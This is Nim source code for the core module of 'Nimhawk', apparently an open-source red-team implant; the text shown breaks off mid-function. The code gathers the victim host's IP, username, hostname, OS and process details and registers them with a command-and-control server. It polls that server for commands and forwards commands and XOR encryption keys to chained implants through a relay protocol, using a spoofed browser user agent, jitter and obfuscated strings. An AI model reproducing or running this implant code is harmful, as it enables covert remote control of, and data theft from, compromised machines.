#[
    Nimhawk Multi-Platform Implant with Dynamic Relay System
    Simple polling-based relay system without threads
    by Alejandro Parodi (@hdbreaker_)
]#

import os, random, strutils, times, math, osproc, net, nativesockets, json
import tables
import asyncdispatch
import core/webClientListener
# Import persistence functions
from core/webClientListener import getStoredImplantID, storeImplantID
from config/configParser import parseConfig, INITIAL_XOR_KEY
import util/[strenc, sysinfo, crypto]
import core/cmdParser
import core/relay/[relay_protocol, relay_comm, relay_config]
import modules/relay/relay_commands
# Import the global relay server from relay_commands to avoid conflicts
from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage
# Removed unused threadpool and locks imports

# Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
export isRelayServer, relayServerPort, upstreamRelay, isConnectedToRelay

# Re-export system info functions for compatibility
export getLocalIP, getUsername, getSysHostname, getOSInfo, getCurrentPID, getCurrentProcessName

# ALL RELAY SERVER FUNCTIONS MOVED TO relay_commands.nim - USING SAFE PROTOCOL!

# Simple async communication queues (no locks needed in single-thread async)
type
    CommandTask* = object
        guid*: string
        command*: string
        args*: seq[string]
        targetClientId*: string
        timestamp*: int64
    
    CommandResult* = object
        guid*: string
        result*: string
        clientId*: string
        timestamp*: int64
    
    RelayRegistration* = object
        clientId*: string
        localIP*: string
        username*: string
        hostname*: string
        osInfo*: string
        pid*: int
        processName*: string
        timestamp*: int64

# Global async state (no locks needed)
var
    g_commandsFromC2*: seq[CommandTask] = @[]
    g_commandsToC2*: seq[CommandResult] = @[]
    g_relayRegistrations*: seq[RelayRegistration] = @[]
    # g_relayServer is now imported from relay_commands.nim to avoid conflicts
    
# Global relay client ID and encryption key for consistent messaging
var g_relayClientID: string = ""
var g_relayClientKey: string = ""

# Global relay server ID (fixed, generated once)
var g_relayServerID: string = ""

# Generate fixed relay server ID
proc getRelayServerID*(): string =
    if g_relayServerID == "":
        # Generate ONCE and reuse forever
        let config = getRelayConfig()
        randomize()
        let randomPart = rand(1000..9999)
        g_relayServerID = config.implantIDPrefix & "RELAY-SERVER-" & $randomPart
        when defined debug:
            echo "[DEBUG] 🆔 Generated FIXED relay server ID: " & g_relayServerID
    return g_relayServerID

# Speed optimization constants - CLIENT-SIDE CONFIGURATION
when defined(FAST_MODE):
    const CLIENT_FAST_MODE* = true
    const RELAY_POLL_INTERVAL = 1000    # 1 second in fast mode (was 500ms - too aggressive)
    const ERROR_RECOVERY_SLEEP = 1000   # 1 second error recovery in fast mode
    const RECONNECT_DELAY = 2000        # 2 seconds reconnect delay in fast mode
else:
    const CLIENT_FAST_MODE* = false
    const RELAY_POLL_INTERVAL = 2000    # 2 seconds normal mode (was 1000ms)
    const ERROR_RECOVERY_SLEEP = 2000   # 2 seconds error recovery normal mode  
    const RECONNECT_DELAY = 3000        # 3 seconds reconnect delay normal mode

# Server-side adaptive timing (adapts to client mode)
var g_serverFastMode* = false  # Server adapts to client mode dynamically
var g_adaptiveMaxSleep* = 2000  # Default 2 seconds, adapts to client

# Reconnection management to prevent infinite loops
type
    ReconnectionManager* = object
        attempts*: int
        lastAttemptTime*: int64
        maxAttempts*: int
        baseDelay*: int  # milliseconds
        maxDelay*: int   # milliseconds
        backoffMultiplier*: float

var g_reconnectionManager*: ReconnectionManager = ReconnectionManager(
    attempts: 0,
    lastAttemptTime: 0,
    maxAttempts: 10,  # Max 10 attempts before giving up
    baseDelay: 2000,  # Start with 2 seconds
    maxDelay: 300000, # Max 5 minutes delay
    backoffMultiplier: 2.0  # Double delay each time
)

proc canAttemptReconnection*(): bool =
    ## Check if we can attempt reconnection based on backoff policy
    let currentTime = epochTime().int64
    
    # Reset attempts if enough time has passed (1 hour cooldown)
    if currentTime - g_reconnectionManager.lastAttemptTime > 3600:
        g_reconnectionManager.attempts = 0
        when defined debug:
            echo "[RECONNECT] 🔄 Attempt counter reset after 1 hour cooldown"
    
    # Check if we've exceeded max attempts
    if g_reconnectionManager.attempts >= g_reconnectionManager.maxAttempts:
        when defined debug:
            echo "[RECONNECT] 🚨 Max reconnection attempts exceeded (" & $g_reconnectionManager.maxAttempts & ")"
            echo "[RECONNECT] 🚨 Entering long cooldown period"
        return false
    
    return true

proc getReconnectionDelay*(): int =
    ## Calculate exponential backoff delay for reconnection
    let baseDelay = float(g_reconnectionManager.baseDelay)
    let multiplier = pow(g_reconnectionManager.backoffMultiplier, float(g_reconnectionManager.attempts))
    let delay = int(baseDelay * multiplier)
    
    # Apply max delay cap
    result = min(delay, g_reconnectionManager.maxDelay)
    
    when defined debug:
        echo "[RECONNECT] 📊 Backoff calculation:"
        echo "[RECONNECT] 📊 - Attempt: " & $g_reconnectionManager.attempts
        echo "[RECONNECT] 📊 - Base delay: " & $baseDelay.int & "ms"
        echo "[RECONNECT] 📊 - Multiplier: " & $multiplier
        echo "[RECONNECT] 📊 - Calculated delay: " & $delay & "ms"
        echo "[RECONNECT] 📊 - Final delay (capped): " & $result & "ms"

proc recordReconnectionAttempt*() =
    ## Record a reconnection attempt for backoff tracking
    g_reconnectionManager.attempts += 1
    g_reconnectionManager.lastAttemptTime = epochTime().int64
    
    when defined debug:
        echo "[RECONNECT] 📈 Recorded attempt #" & $g_reconnectionManager.attempts & "/" & $g_reconnectionManager.maxAttempts

proc resetReconnectionManager*() =
    ## Reset reconnection manager after successful connection
    g_reconnectionManager.attempts = 0
    g_reconnectionManager.lastAttemptTime = epochTime().int64
    
    when defined debug:
        echo "[RECONNECT] ✅ Reconnection manager reset after successful connection"

# Network Adaptive Throttling System
type
    NetworkHealth* = object
        rtt*: float  # Round-trip time in milliseconds
        consecutiveErrors*: int
        lastSuccessTime*: int64
        isSlowNetwork*: bool
        adaptiveMultiplier*: float

var g_networkHealth*: NetworkHealth = NetworkHealth(
    rtt: 50.0,  # Start with 50ms baseline
    consecutiveErrors: 0,
    lastSuccessTime: epochTime().int64,
    isSlowNetwork: false,
    adaptiveMultiplier: 1.0
)

# Enhanced network health management with safety margins
proc updateNetworkHealth*(startTime: float, success: bool) =
    let currentTime = epochTime()
    
    if success:
        # Calculate RTT and update network health with proper float precision
        let rtt = (currentTime - startTime) * 1000.0  # Convert to milliseconds
        
        # Ensure RTT is reasonable (between 1ms and 60s)
        let validRtt = max(min(rtt, 60000.0), 1.0)
        
        # Exponential moving average for RTT
        g_networkHealth.rtt = (g_networkHealth.rtt * 0.7) + (validRtt * 0.3)
        g_networkHealth.consecutiveErrors = 0
        g_networkHealth.lastSuccessTime = currentTime.int64
        
        # SAFETY MARGIN: Reset multiplier gradually when network improves
        let oldMultiplier = g_networkHealth.adaptiveMultiplier
        
        # Determine if network is slow (RTT > 200ms)
        g_networkHealth.isSlowNetwork = g_networkHealth.rtt > 200.0
        
        # Calculate adaptive multiplier based on network conditions with safety margins
        if g_networkHealth.rtt > 500.0:
            g_networkHealth.adaptiveMultiplier = 4.0  # Very slow network
        elif g_networkHealth.rtt > 200.0:
            g_networkHealth.adaptiveMultiplier = 2.0  # Slow network
        elif g_networkHealth.rtt > 100.0:
            g_networkHealth.adaptiveMultiplier = 1.5  # Medium network
        else:
            # SAFETY MARGIN: Gradual reduction instead of immediate reset
            if oldMultiplier > 1.0:
                g_networkHealth.adaptiveMultiplier = max(1.0, oldMultiplier * 0.8)  # 20% reduction per success
                when defined debug:
                    echo "[DEBUG] 🌐 ⚡ Gradual multiplier reduction: " & $oldMultiplier & " → " & $g_networkHealth.adaptiveMultiplier
            else:
                g_networkHealth.adaptiveMultiplier = 1.0  # Fast network
        
        when defined debug:
            echo "[DEBUG] 🌐 Network Health Updated - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Raw RTT: " & $validRtt.int & "ms"
    else:
        # Network error - increase consecutive errors and implement exponential backoff
        g_networkHealth.consecutiveErrors += 1
        let errorMultiplier = min(pow(2.0, float(g_networkHealth.consecutiveErrors)), 8.0)  # Max 8x backoff
        
        # SAFETY MARGIN: Don't let error multiplier override good RTT-based multiplier
        let rttBasedMultiplier = if g_networkHealth.rtt > 500.0: 4.0
                                elif g_networkHealth.rtt > 200.0: 2.0
                                elif g_networkHealth.rtt > 100.0: 1.5
                                else: 1.0
        
        # Use the higher of error-based or RTT-based multiplier
        g_networkHealth.adaptiveMultiplier = max(rttBasedMultiplier, errorMultiplier)
        
        when defined debug:
            echo "[DEBUG] 🚨 Network Error - Consecutive: " & $g_networkHealth.consecutiveErrors & ", Error Multiplier: " & $errorMultiplier & ", RTT Multiplier: " & $rttBasedMultiplier & ", Final: " & $g_networkHealth.adaptiveMultiplier

# SAFETY RESET: Force reset of network health after extended periods
proc resetNetworkHealthIfStuck*() =
    let currentTime = epochTime().int64
    let timeSinceLastUpdate = currentTime - g_networkHealth.lastSuccessTime
    
    # If no success for 5 minutes and multiplier is high, force reset
    if timeSinceLastUpdate > 300 and g_networkHealth.adaptiveMultiplier > 2.0:
        when defined debug:
            echo "[DEBUG] 🔄 SAFETY RESET: Network health stuck for " & $timeSinceLastUpdate & "s"
            echo "[DEBUG] 🔄 Old state - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Errors: " & $g_networkHealth.consecutiveErrors
        
        # Gradual reset instead of immediate
        g_networkHealth.adaptiveMultiplier = max(1.5, g_networkHealth.adaptiveMultiplier * 0.5)  # Half the multiplier
        g_networkHealth.consecutiveErrors = max(0, g_networkHealth.consecutiveErrors - 2)  # Reduce errors by 2
        g_networkHealth.rtt = min(g_networkHealth.rtt, 100.0)  # Cap RTT at reasonable value
        
        when defined debug:
            echo "[DEBUG] 🔄 New state - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Errors: " & $g_networkHealth.consecutiveErrors
            echo "[DEBUG] 🔄 ✅ Network health safety reset completed"

# Get adaptive polling interval based on network conditions with safety bounds
proc getAdaptivePollingInterval*(): int =
    # SAFETY CHECK: Reset network health if stuck
    resetNetworkHealthIfStuck()
    
    let baseInterval = if CLIENT_FAST_MODE: 1000 else: 2000
    let adaptiveInterval = int(float(baseInterval) * g_networkHealth.adaptiveMultiplier)
    
    # ENHANCED SAFETY BOUNDS: Stricter limits to prevent extreme delays
    result = min(max(adaptiveInterval, 500), 20000)  # Max 20s instead of 30s
    
    when defined(debug):
        if result != adaptiveInterval:
            echo "[DEBUG] 🛡️  SAFETY BOUND APPLIED: Requested " & $adaptiveInterval & "ms, capped to " & $result & "ms"

# Get adaptive timeout based on network conditions with safety bounds
proc getAdaptiveTimeout*(): int =
    let baseTimeout = if g_networkHealth.isSlowNetwork: 200 else: 100
    let adaptiveTimeout = int(float(baseTimeout) * g_networkHealth.adaptiveMultiplier)
    
    # ENHANCED SAFETY BOUNDS: Stricter timeout limits
    result = min(max(adaptiveTimeout, 50), 3000)  # Max 3s instead of 5s
    
    when defined(debug):
        if result != adaptiveTimeout:
            echo "[DEBUG] 🛡️  TIMEOUT SAFETY BOUND: Requested " & $adaptiveTimeout & "ms, capped to " & $result & "ms"

# Connect to upstream relay
proc connectToUpstreamRelay(host: string, port: int): string =
    when defined debug:
        echo "[DEBUG] Connecting to upstream relay: " & host & ":" & $port
    
    try:
        upstreamRelay = connectToRelay(host, port)
        if upstreamRelay.isConnected:
            when defined debug:
                echo "[DEBUG] Successfully connected to upstream relay"
            
            # Send registration with complete system info
            # CRITICAL: Preserve existing ID during reconnections (prevents ID amnesia)
            var implantID: string
            
            # PRIORITY 1: Use in-memory ID if available (prevents ID amnesia during reconnects)
            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
                implantID = g_relayClientID
                when defined debug:
                    echo "[DEBUG] 🧠 RECONNECT: Using IN-MEMORY relay client ID: " & implantID & " (prevents ID amnesia)"
                
                # CRITICAL: Ensure in-memory ID is also persisted to disk
                let diskID = getStoredImplantID()
                if diskID != implantID:
                    storeImplantID(implantID)
                    when defined debug:
                        echo "[DEBUG] 💾 PERSIST: Re-saved in-memory ID to disk: " & implantID
                else:
                    when defined debug:
                        echo "[DEBUG] ✅ PERSIST: ID already correctly stored on disk"
            else:
                # PRIORITY 2: Use stored ID from disk (first run or memory cleared)
                implantID = getStoredImplantID()
                if implantID != "":
                    when defined debug:
                        echo "[DEBUG] 💾 FIRST RUN: Using STORED relay client ID: " & implantID
                    # Store in memory for future reconnects
                    g_relayClientID = implantID
                else:
                    # PRIORITY 3: New registration only if no ID exists anywhere
                    implantID = "PENDING-REGISTRATION"
                    when defined debug:
                        echo "[DEBUG] 🆕 NEW CLIENT: No existing ID - requesting new registration from C2"
            
            # Store the ID globally for consistent use
            g_relayClientID = implantID
            
            let route = @[implantID, "UPSTREAM"]
            
            # Collect system information for relay registration
            let localIP = getLocalIP()
            let username = getUsername()
            let hostname = getSysHostname()
            let osInfo = getOSInfo()
            let pid = getCurrentPID()
            let processName = getCurrentProcessName()
            
            # Create complete registration data as JSON
            let regData = %*{
                "implantID": implantID,
                "localIP": localIP,
                "username": username,
                "hostname": hostname,
                "osInfo": osInfo,
                "pid": pid,
                "processName": processName,
                "timestamp": epochTime().int64,
                "capabilities": ["relay", "client"],
                "mode": "relay_client",
                "fastMode": CLIENT_FAST_MODE,  # Include client fast mode setting
                "pollInterval": RELAY_POLL_INTERVAL  # Include client polling interval for server adaptation
            }
            
            let registerMsg = createMessage(REGISTER, implantID, route, $regData)
            
            if sendMessage(upstreamRelay, registerMsg):
                when defined debug:
                    echo "[DEBUG] Registered with upstream relay"
                return "Connected and registered with upstream relay: " & host & ":" & $port
            else:
                when defined debug:
                    echo "[DEBUG] Failed to register with upstream relay"
                return "Connected to upstream relay but failed to register: " & host & ":" & $port
        else:
            when defined debug:
                echo "[DEBUG] Failed to connect to upstream relay"
            return "Failed to connect to upstream relay: " & host & ":" & $port
    except Exception as e:
        return "Error connecting to upstream relay: " & e.msg

# processRelayCommand is now imported from modules/relay/relay_commands

# Safe encryption key management to prevent desync cascade
proc safeKeySwap(listener: var Listener, newKey: string): string =
    ## Safely swap encryption keys with atomic rollback protection
    let originalKey = listener.UNIQUE_XOR_KEY
    listener.UNIQUE_XOR_KEY = newKey
    return originalKey

proc safeKeyRestore(listener: var Listener, originalKey: string) =
    ## Safely restore original encryption key
    listener.UNIQUE_XOR_KEY = originalKey
    when defined debug:
        echo "[KEY] 🔑 Encryption key restored safely"

proc clearSensitiveKey(key: var string) =
    ## Securely clear encryption key from memory
    if key != "":
        # Overwrite with zeros before clearing
        for i in 0..<key.len:
            key[i] = '\0'
        key = ""
        when defined debug:
            echo "[KEY] 🧹 Sensitive key cleared from memory"

# Async HTTP handler - Handles C2 communication
proc httpHandler() {.async.} =
    when defined debug:
        echo "[DEBUG] 🌐 Starting async HTTP handler"
    
    # Parse configuration
    let CONFIG: Table[string, string] = configParser.parseConfig()
    
    # Create listener object with configuration
    var listener = Listener()
    
    # Load configuration into listener
    listener.listenerType = CONFIG.getOrDefault("listenerType", "HTTP")
    listener.listenerHost = CONFIG.getOrDefault("hostname", "")
    listener.implantCallbackIp = CONFIG.getOrDefault("implantCallbackIp", "127.0.0.1")
    listener.listenerPort = CONFIG.getOrDefault("listenerPort", "80")
    listener.registerPath = CONFIG.getOrDefault("listenerRegPath", "/register")
    listener.taskPath = CONFIG.getOrDefault("listenerTaskPath", "/task")
    listener.resultPath = CONFIG.getOrDefault("listenerResPath", "/result")
    listener.reconnectPath = CONFIG.getOrDefault("reconnectPath", "/reconnect")
    listener.userAgent = CONFIG.getOrDefault("userAgent", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko")
    listener.httpAllowCommunicationKey = CONFIG.getOrDefault("httpAllowCommunicationKey", "DefaultKey123")
    listener.sleepTime = parseInt(CONFIG.getOrDefault("sleepTime", "10"))
    listener.sleepJitter = parseFloat(CONFIG.getOrDefault("sleepJitter", "0"))
    listener.killDate = CONFIG.getOrDefault("killDate", "")
    
    # Initialize HTTP listener
    webClientListener.init(listener)
    
    # Register this implant with C2
    let localIP = getLocalIP()
    let username = getUsername()
    let hostname = getSysHostname()
    let osInfo = getOSInfo()
    let pid = getCurrentPID()
    let processName = getCurrentProcessName()
    
    webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
                                         osInfo, pid, processName, false)
    
    when defined debug:
        echo "[DEBUG] 🌐 HTTP Handler: Implant registered with C2"
        echo "[DEBUG] 🌐 HTTP Handler: Starting polling loop with " & $listener.sleepTime & "s interval"
    
    # MAIN POLLING LOOP - This is what was missing!
    var httpCycleCount = 0
    while true:
        try:
            httpCycleCount += 1
            
            when defined debug:
                echo ""
                echo ""
                echo ""
                echo "┌─ 🌐 HTTP HANDLER CYCLE #" & $httpCycleCount
                echo "├─ C2: " & listener.implantCallbackIp & ":" & listener.listenerPort & " │ Sleep: " & $listener.sleepTime & "s │ Relay: " & $g_relayServer.isListening
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo "[DEBUG] 🌐 HTTP Handler: Starting polling cycle"
            
            # 1. Handle relay registrations - forward to C2
            for registration in g_relayRegistrations:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Forwarding relay registration to C2: " & registration.clientId
                
                discard webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                          registration.localIP, registration.username, 
                                                          registration.hostname, registration.osInfo, 
                                                          registration.pid, registration.processName, true)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
            
            g_relayRegistrations = @[]  # Clear processed registrations
            
            # 1.5. CRITICAL: Poll relay server for messages (if running)
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Checking relay server status - isListening: " & $g_relayServer.isListening
                echo "[DEBUG] 🌐 HTTP Handler: Relay server port: " & $g_relayServer.port
                let stats = relay_commands.getConnectionStats(g_relayServer)
                echo "[DEBUG] 🌐 HTTP Handler: Relay server connections: " & $stats.connections
            
            if g_relayServer.isListening:
                when defined debug:
                    echo ""
                    echo "┌─ 📡 RELAY SERVER POLLING CYCLE"
                    let stats = relay_commands.getConnectionStats(g_relayServer)
                    echo "├─ Port: " & $g_relayServer.port & " │ Connections: " & $stats.connections & " │ Fast: " & $g_serverFastMode
                    echo "└─────────────────────────────────────────────────────────"
                    echo ""
                    echo "[DEBUG] 🌐 HTTP Handler: Polling relay server for messages"
                
                # Declare messageCount outside try block for end-of-cycle logging
                var messageCount = 0
                
                try:
                    let messages = pollRelayServerMessages()  # Use function from relay_commands.nim
                    
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: Relay server returned " & $messages.len & " messages"
                        if messages.len > 0:
                            for i, msg in messages:
                                echo "[DEBUG] 🌐 HTTP Handler: Message " & $i & " - Type: " & $msg.msgType & ", From: " & msg.fromID & ", Payload: " & $msg.payload.len & " bytes"
                    
                    # Capture message count for end-of-cycle logging
                    messageCount = messages.len
                    
                    for msg in messages:
                        when defined debug:
                            echo "[DEBUG] 🌐 HTTP Handler: ===== PROCESSING MESSAGE ====="
                            echo "[DEBUG] 🌐 HTTP Handler: Message Type: " & $msg.msgType
                            echo "[DEBUG] 🌐 HTTP Handler: From ID: " & msg.fromID
                            echo "[DEBUG] 🌐 HTTP Handler: Route: " & $msg.route
                            echo "[DEBUG] 🌐 HTTP Handler: Payload Length: " & $msg.payload.len
                            echo "[DEBUG] 🌐 HTTP Handler: Payload (first 100 chars): " & (if msg.payload.len > 100: msg.payload[0..99] & "..." else: msg.payload)
                            echo "[DEBUG] 🌐 HTTP Handler: ============================="
                        
                        case msg.msgType:
                        of REGISTER:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Processing relay client registration"
                            
                            # Decrypt and parse registration data
                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Decrypted registration: " & decryptedPayload
                            
                            try:
                                let regData = parseJson(decryptedPayload)
                                let registration = RelayRegistration(
                                    clientId: regData["implantID"].getStr(),
                                    localIP: regData["localIP"].getStr(),
                                    username: regData["username"].getStr(),
                                    hostname: regData["hostname"].getStr(),
                                    osInfo: regData["osInfo"].getStr(),
                                    pid: regData["pid"].getInt(),
                                    processName: regData["processName"].getStr(),
                                    timestamp: epochTime().int64
                                )
                                
                                # CHECK IF THIS IS A NEW REGISTRATION OR RE-REGISTRATION
                                var assignedId: string
                                var encryptionKey: string
                                
                                if registration.clientId == "PENDING-REGISTRATION":
                                    # NEW REGISTRATION: Forward to C2 to get assigned ID and encryption key
                                    when defined debug:
                                        echo "[DEBUG] 🆕 HTTP Handler: NEW relay client registration - forwarding to C2"
                                    
                                    let (newId, newKey) = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                                              registration.localIP, registration.username, 
                                                                              registration.hostname, registration.osInfo, 
                                                                              registration.pid, registration.processName, true)
                                    assignedId = newId
                                    encryptionKey = newKey
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🆕 HTTP Handler: C2 assigned new ID: " & assignedId
                                else:
                                    # RE-REGISTRATION: Client has existing ID, don't change it!
                                    assignedId = registration.clientId  # Keep the existing ID
                                    encryptionKey = ""  # Client will use its existing encryption key
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🔄 HTTP Handler: RE-REGISTRATION detected - keeping existing ID: " & assignedId
                                        echo "[DEBUG] 🔄 HTTP Handler: NOT forwarding to C2, accepting existing client"
                                
                                # ADAPTIVE TIMING: Check if client is in fast mode and adapt server timing
                                if regData.hasKey("fastMode") and regData["fastMode"].getBool():
                                    g_serverFastMode = true
                                    g_adaptiveMaxSleep = 1000  # 1 second for fast mode
                                    when defined debug:
                                        echo "[DEBUG] 🚀 HTTP Handler: Client is in FAST_MODE - Server adapting to fast timing (1s)"
                                else:
                                    g_serverFastMode = false
                                    g_adaptiveMaxSleep = 2000  # 2 seconds for normal mode
                                    when defined debug:
                                        echo "[DEBUG] 🐌 HTTP Handler: Client is in normal mode - Server using normal timing (2s)"
                                
                                when defined debug:
                                    echo "[DEBUG] ⚙️  HTTP Handler: Server adaptive timing configured"
                                    echo "[DEBUG] ⚙️  HTTP Handler: - Fast mode: " & $g_serverFastMode
                                    echo "[DEBUG] ⚙️  HTTP Handler: - Max sleep: " & $g_adaptiveMaxSleep & "ms"
                                    if regData.hasKey("pollInterval"):
                                        echo "[DEBUG] ⚙️  HTTP Handler: - Client poll interval: " & $regData["pollInterval"].getInt() & "ms"
                                
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
                                    echo "[DEBUG] 🌐 HTTP Handler: Original ID: " & registration.clientId
                                    echo "[DEBUG] 🔑 HTTP Handler: Got encryption key (length: " & $encryptionKey.len & ")"
                                
                                # Send response back to relay client
                                if assignedId != "":
                                    var responseData: JsonNode
                                    
                                    if encryptionKey != "":
                                        # NEW REGISTRATION: Send both ID and encryption key
                                        responseData = %*{
                                            "id": assignedId,
                                            "key": encryptionKey
                                        }
                                        when defined debug:
                                            echo "[DEBUG] 🆕 HTTP Handler: Sending NEW ID and encryption key to client"
                                    else:
                                        # RE-REGISTRATION: Send confirmation with existing ID (no new key)
                                        responseData = %*{
                                            "id": assignedId,
                                            "status": "reconnected"
                                        }
                                        when defined debug:
                                            echo "[DEBUG] 🔄 HTTP Handler: Sending RE-REGISTRATION confirmation to client"
                                    
                                    let idMsg = createMessage(HTTP_RESPONSE,
                                        getRelayServerID(),
                                        @[registration.clientId, "RELAY-SERVER"],
                                        $responseData
                                    )
                                    
                                    let stats = relay_commands.getConnectionStats(g_relayServer)
                                    if stats.connections > 0:
                                        discard broadcastMessage(g_relayServer, idMsg)
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Registration response sent to relay client: " & assignedId
                                    else:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send registration data to"
                                else:
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ No valid ID for relay client registration"
                                
                            except Exception as e:
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ❌ Error parsing relay registration: " & e.msg
                        
                        of PULL:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Relay client requesting commands (PULL = check-in)"
                            
                            # Extract the relay client's encryption key from PULL payload
                            when defined debug:
                                echo "[DEBUG] 💓 HTTP Handler: Performing check-in to C2 on behalf of relay client: " & msg.fromID
                            
                            # SAFE KEY MANAGEMENT: Temporarily change listener ID and encryption key to relay client's values
                            let originalId = listener.id
                            var originalKey = ""  # Will be set by safeKeySwap
                            listener.id = msg.fromID
                            
                            # Extract the relay client's encryption key from the PULL payload
                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
                            var relayClientKey = ""
                            
                            try:
                                # Try to parse as JSON to get the encryption key
                                let pullData = parseJson(decryptedPayload)
                                let encryptedKey = pullData["key"].getStr()
                                
                                # Decrypt the relay client's encryption key using INITIAL_XOR_KEY
                                relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔑 Decrypted encryption key from relay client PULL request: " & msg.fromID
                                    echo "[DEBUG] 🔑 Key length: " & $relayClientKey.len
                                    echo "[DEBUG] 🔑 Encrypted key from client: " & encryptedKey[0..min(15, encryptedKey.len-1)] & "..."
                                    echo "[DEBUG] 🔑 INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY
                                    echo "[DEBUG] 🔑 Decrypted key preview: " & relayClientKey[0..min(15, relayClientKey.len-1)] & "..."
                                
                                # SAFE KEY SWAP: Use atomic key swapping to prevent desync
                                originalKey = safeKeySwap(listener, relayClientKey)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔑 ✅ Safe key swap completed - using relay client encryption key"
                                    echo "[DEBUG] 🔑 Original key length: " & $originalKey.len
                                    echo "[DEBUG] 🔑 Relay client key length: " & $relayClientKey.len
                                
                            except Exception as e:
                                when defined debug:
                                    echo "[DEBUG] ⚠️  Failed to extract/decrypt encryption key from PULL payload: " & msg.fromID
                                    echo "[DEBUG] ⚠️  Error: " & e.msg
                                    echo "[DEBUG] ⚠️  Payload: " & decryptedPayload
                                    echo "[DEBUG] ⚠️  Using relay server's key as fallback"
                                # Keep original key if decryption fails - no key swap needed
                                originalKey = listener.UNIQUE_XOR_KEY
                            
                            # Perform check-in to C2 for relay client using exported function
                            when defined debug:
                                echo "[DEBUG] 💓 HTTP Handler: Making C2 check-in with relay client credentials"
                                echo "[DEBUG] 💓 HTTP Handler: Client ID: " & listener.id
                                echo "[DEBUG] 💓 HTTP Handler: Using encryption key length: " & $listener.UNIQUE_XOR_KEY.len
                                echo "[DEBUG] 💓 HTTP Handler: About to call getQueuedCommand() for relay client"
                                echo "[DEBUG] 💓 HTTP Handler: C2 Host: " & listener.implantCallbackIp & ":" & listener.listenerPort
                                echo "[DEBUG] 💓 HTTP Handler: Expected to prevent LATE status for: " & listener.id
                                
                            let checkInStartTime = epochTime()
                            let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
                            let checkInDuration = (epochTime() - checkInStartTime) * 1000.0  # Convert to ms
                            
                            when defined debug:
                                echo "[DEBUG] 💓 HTTP Handler: getQueuedCommand() completed in " & $checkInDuration.int & "ms"
                                echo "[DEBUG] 💓 HTTP Handler: Raw response analysis:"
                                echo "[DEBUG] 💓 HTTP Handler: - Command empty: " & $(cmd == "")
                                echo "[DEBUG] 💓 HTTP Handler: - Command is connection error: " & $(cmd == obf("NIMPLANT_CONNECTION_ERROR"))
                                if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                                    echo "[DEBUG] 💓 HTTP Handler: ❌ CHECK-IN FAILED - C2 CONNECTION ERROR"
                                    echo "[DEBUG] 💓 HTTP Handler: ❌ Relay client " & msg.fromID & " will be marked as LATE!"
                                elif cmd == "":
                                    echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - No commands for " & msg.fromID
                                else:
                                    echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - Got command for " & msg.fromID
                                    echo "[DEBUG] 💓 HTTP Handler: - Command content: '" & cmd & "'"
                                    echo "[DEBUG] 💓 HTTP Handler: - Command length: " & $cmd.len
                                echo "[DEBUG] 💓 HTTP Handler: - GUID content: '" & cmdGuid & "'"
                                echo "[DEBUG] 💓 HTTP Handler: - Args count: " & $args.len
                                if args.len > 0:
                                    echo "[DEBUG] 💓 HTTP Handler: - Args: " & $args
                            
                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key BEFORE processing response
                            listener.id = originalId
                            safeKeyRestore(listener, originalKey)
                            
                            # SECURITY: Clear the relay client's encryption key from memory AFTER all operations
                            clearSensitiveKey(relayClientKey)
                            
                            # CRITICAL: ALWAYS send a response to PULL requests!
                            if cmd != "" and cmd != obf("NIMPLANT_CONNECTION_ERROR"):
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: Sending command to relay client: " & cmd
                                    echo "[DEBUG] 🌐 HTTP Handler: Command GUID: " & cmdGuid
                                
                                # Create command payload with both command and cmdGuid
                                let commandPayload = %*{
                                    "cmdGuid": cmdGuid,
                                    "command": cmd,
                                    "args": args
                                }
                                
                                # Create command message with JSON payload
                                let cmdMsg = createMessage(COMMAND,
                                    getRelayServerID(),
                                    msg.route,
                                    $commandPayload
                                )
                                
                                # Send command to relay client
                                let stats = relay_commands.getConnectionStats(g_relayServer)
                                if stats.connections > 0:
                                    discard broadcastMessage(g_relayServer, cmdMsg)
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to " & $stats.connections & " relay clients"
                            else:
                                # NO COMMANDS or CONNECTION ERROR - Still send a response!
                                when defined debug:
